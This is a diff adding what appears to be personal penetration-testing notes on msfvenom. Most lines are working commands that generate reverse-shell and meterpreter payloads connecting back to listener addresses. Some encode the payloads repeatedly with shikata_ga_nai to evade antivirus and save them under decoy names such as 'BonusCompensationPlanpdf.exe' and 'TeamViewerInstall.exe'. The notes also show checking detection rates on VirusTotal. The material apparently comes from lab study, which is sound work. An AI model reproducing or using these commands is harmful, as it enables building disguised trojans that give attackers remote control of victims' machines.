@@ -1,0 +1,35 @@
+MSFVENOM!
+This tool is used to create payloads
+
+list payloads:
+msfvenom -l payloads
+
+
+staged payloads -- sent in parts, first part executed on target, which downloads and runs the rest of the payload, better for complex functionality
+
+stageless payloads -- sent in full, better for low-bandwidth networks, stealthier
+
+CREATING STAGELESS PAYLOAD
+msfvenom -p <payload-for-platform-listed> LHOST=<host-ip> LPORT=<host-port> -f elf > 
+
+example (LINUX):
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > payloadname.elf
+
+example (WINDOWS):
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
+[.exe,.dll,.bat,.msi,.vbs,.ps1]
+
+
+
+GENERATING PAYLOAD WITH ENCODING (example):
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
+
+if you want to export it as a specific name, use -o
+if you want to encode it with MULTIPLE ITERATIONS:
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
+
+
+to use MSF-VIRUSTOTAL to check your .exe:
+1. sign up for free account on virustotal and get an API key
+2. msf-virustotal -k <api key> -f TeamViewerInstall.exe
+
